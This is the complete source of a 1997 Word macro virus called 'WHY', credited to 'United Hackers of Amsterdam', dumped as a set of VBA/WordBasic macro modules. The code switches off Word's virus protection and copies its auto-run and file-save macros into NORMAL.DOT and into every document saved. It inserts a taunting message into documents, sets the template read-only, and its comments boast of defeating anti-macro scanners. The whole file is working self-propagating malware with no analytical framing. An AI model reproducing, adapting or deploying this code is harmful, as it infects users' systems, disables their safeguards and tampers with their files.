   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "ToolsOptions"

   ' United Hackers of Amsterdam
   '     Creators da virii
   '      Cybertro@dds.nl

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "United Hackers of Amsterdam\r\n       WHY macro virus"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ToolsOptions.MAIN"
   Dim false_
   Dim dlgGeneral

   WordBasic.DisableAutoMacros 0

   WordBasic.MsgBox "(c) 1997 United Hackers of Amsterdam"
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.WW7_ToolsOptions(False)
   WordBasic.CurValues.WW7_ToolsOptions dlg
   On Error Goto -1 : On Error Goto err.Number
   WordBasic.WW7_ToolsOptions dlg
   WordBasic.ToolsOptionsGeneral VirusProtection:=false_
   WordBasic.ToolsOptionsGeneral dlgGeneral
   Err.Number:
   End Sub

   Attribute VB_Name = "FileSaveAs"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "United Hackers of Amsterdam\r\n     WHY macro virus"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
   Dim nd$
   Dim namef$
   Dim named$
   Dim namefa$
   Dim nameda$
   Dim namefb$
   Dim namedb$
   Dim namefc$
   Dim namedc$
   Dim namefd$
   Dim namedd$
   Dim namefe$
   Dim namede$

   '=============================
   ' United Hackers of Amsterdam
   '     Creators da virii
   '         presents
   '      WHY macro virus
   '      Cybertro@dds.nl
   '=============================


   WordBasic.DisableAutoMacros 0

   Dim n As Object: Set n = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs n
   On Error Goto -1 : On Error Goto err.Number
   WordBasic.Dialog.FileSaveAs n
   If n.Format <> 1 Then n.Format = 1

   nd$ = UCase(WordBasic.[DefaultDir$](2) + "\NORMAL.DOT")
   namef$ = WordBasic.[FileName$]() + ":AutoOpen"
   named$ = nd$ + ":AutoOpen"
   namefa$ = WordBasic.[FileName$]() + ":FileSaveAs"
   nameda$ = nd$ + ":FileSaveAs"
   namefb$ = WordBasic.[FileName$]() + ":ToolsMacro"
   namedb$ = nd$ + ":ToolsMacro"
   namefc$ = WordBasic.[FileName$]() + ":ToolsOptions"
   namedc$ = nd$ + ":ToolsOptions"
   namefd$ = WordBasic.[FileName$]() + ":AutoExec"
   namedd$ = nd$ + ":AutoExec"
   namefe$ = WordBasic.[FileName$]() + ":AutoExit"
   namede$ = nd$ + ":AutoExit"


   WordBasic.MacroCopy nameda$, namefa$  ', - 1  Delete "'" to close Macro!
   WordBasic.MacroCopy named$, namef$  ', - 1 -------------||----------
   WordBasic.MacroCopy namedb$, namefb$  ', - 1 -------------||----------
   WordBasic.MacroCopy namedc$, namefc$  ', - 1 -------------||----------
   WordBasic.MacroCopy namedd$, namefd$  ', - 1 -------------||----------
   WordBasic.MacroCopy namede$, namefe$  ', - 1 -------------||----------

   WordBasic.FileSaveAs n
   On Error Goto -1 : On Error Goto err.Number
   Err.Number:
   End Sub

   Attribute VB_Name = "appToolsM"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "United Hackers of Amsterdam \r\n       WHY macro virus"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.appToolsM.MAIN"
   'Delete ALL REM!

   WordBasic.DisableAutoMacros 0

   WordBasic.MsgBox "(c) 1997 United Hackers of Amsterdam"
   Rem goto UHA
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.ToolsMacro(False)
   WordBasic.CurValues.ToolsMacro dlg
   On Error GoTo -1: On Error GoTo UHA
   WordBasic.Dialog.ToolsMacro dlg
   WordBasic.ToolsMacro dlg
   UHA:
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "United Hackers of Amsterdam\r\n      WHY macro virus"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
   Dim false_
   Dim nd$
   Dim namef$
   Dim named$
   Dim namefa$
   Dim nameda$
   Dim namefb$
   Dim namedb$
   Dim namefc$
   Dim namedc$
   Dim namefd$
   Dim namedd$
   Dim namefe$
   Dim namede$
   Dim iMacroCount
   Dim i
   Dim bIf
   Dim bIs
   Dim bIt
   Dim bIi
   Dim bIa
   Dim bIb
   '=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
   ' United Hackers of Amsterdam
   '         presents
   '      WHY macro virus
   '  another production from
   '        The Wombat
   '=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

   WordBasic.DisableAutoMacros 0

   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.ToolsOptionsGeneral(False)
   WordBasic.CurValues.ToolsOptionsGeneral dlg
   On Error GoTo -1: On Error GoTo continue
   dlg.VirusProtection = false_
   On Error GoTo -1: On Error GoTo continue
   WordBasic.ToolsOptionsGeneral dlg
   continue:

   nd$ = UCase(WordBasic.[DefaultDir$](2) + "\NORMAL.DOT")
   namef$ = WordBasic.[FileName$]() + ":AutoOpen"
   named$ = nd$ + ":AutoOpen"
   namefa$ = WordBasic.[FileName$]() + ":FileSaveAs"
   nameda$ = nd$ + ":FileSaveAs"
   namefb$ = WordBasic.[FileName$]() + ":ToolsMacro"
   namedb$ = nd$ + ":ToolsMacro"
   namefc$ = WordBasic.[FileName$]() + ":ToolsOptions"
   namedc$ = nd$ + ":ToolsOptions"
   namefd$ = WordBasic.[FileName$]() + ":AutoExec"
   namedd$ = nd$ + ":AutoExec"
   namefe$ = WordBasic.[FileName$]() + ":AutoExit"
   namede$ = nd$ + ":AutoExit"


   On Error Goto -1 : On Error Goto err.Number
       iMacroCount = WordBasic.CountMacros(0, 0)
       For i = 1 To iMacroCount
           If WordBasic.[MacroName$](i, 0, 0) = "AutoOpen" Then
               bIf = -1
           End If
           If WordBasic.[MacroName$](i, 0, 0) = "FileSaveAs" Then
               bIs = -1
           End If
           If WordBasic.[MacroName$](i, 0, 0) = "ToolsMacro" Then
               bIt = -1
           End If
           If WordBasic.[MacroName$](i, 0, 0) = "ToolsOptions" Then
               bIi = -1
           End If
           If WordBasic.[MacroName$](i, 0, 0) = "AutoExec" Then
               bIa = -1
           End If
           If WordBasic.[MacroName$](i, 0, 0) = "AutoExit" Then
               bIb = -1
           End If

       Next i
       If Not bIf Or Not bIs Or Not bIt Or Not bIi Or Not bIa Or Not bIb Then
   WordBasic.MacroCopy namefa$, nameda$   ', - 1 Delete "'" to close Macro!
   WordBasic.MacroCopy namef$, named$
   WordBasic.MacroCopy namefb$, namedb$
   WordBasic.MacroCopy namefc$, namedc$
   WordBasic.MacroCopy namefd$, namedd$
   WordBasic.MacroCopy namefe$, namede$

   Goto err.Number
   End If
   Dim n As Object: Set n = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs n
   n.Format = 1

   WordBasic.MacroCopy nameda$, namefa$
   WordBasic.MacroCopy named$, namef$
   WordBasic.MacroCopy namedb$, namefb$
   WordBasic.MacroCopy namedc$, namefc$
   WordBasic.MacroCopy namedd$, namefd$
   WordBasic.MacroCopy namede$, namefe$

   'The Funny part of the virus!
   On Error GoTo -1: On Error GoTo filesavepr
   WordBasic.EndOfDocument
   WordBasic.Insert Chr(11)
   WordBasic.Insert "United Hackers of Amsterdam"
   WordBasic.Insert Chr(11)
   WordBasic.Insert "WHY macro virus"
   WordBasic.Insert Chr(11)
   WordBasic.Insert "We like to give you more of these joyfull macro's but you must send me an email!"
   WordBasic.Insert Chr(11)
   WordBasic.Insert "Cybertro@dds.nl"
   WordBasic.Insert Chr(11)
   WordBasic.StartOfDocument

   filesavepr:
   WordBasic.FileSaveAs n
   Err.Number:
   End Sub

   Attribute VB_Name = "AutoExit"

   '============================
   'United Hackers of Amsterdam
   '    Creators Da Virii
   '        Presents
   '    WHY macro virus
   ' Another creation from
   '       The Wombat
   '============================

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "United Hackers of Amsterdam\r\n      WHY macro virus"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoExit.MAIN"
   Dim nd$

   WordBasic.DisableAutoMacros 0

   nd$ = UCase(WordBasic.[DefaultDir$](2) + "\NORMAL.DOT")
   SetAttr nd$, 1

   End Sub

   Attribute VB_Name = "AutoExec"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "United Hackers of Amsterdam\r\n      WHY macro virus"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoExec.MAIN"
   '====================================================
   ' **************************************************
   ' *     (c) 1997 United Hackers of Amsterdam       *
   ' *                   presents                     *
   ' *               WHY macro virus                  *
   ' *        Another creation by The Wombat          *
   ' **************************************************
   '    This macro fucks up the Anti-macro scanners
   '====================================================

   WordBasic.DisableAutoMacros 0

   End Sub
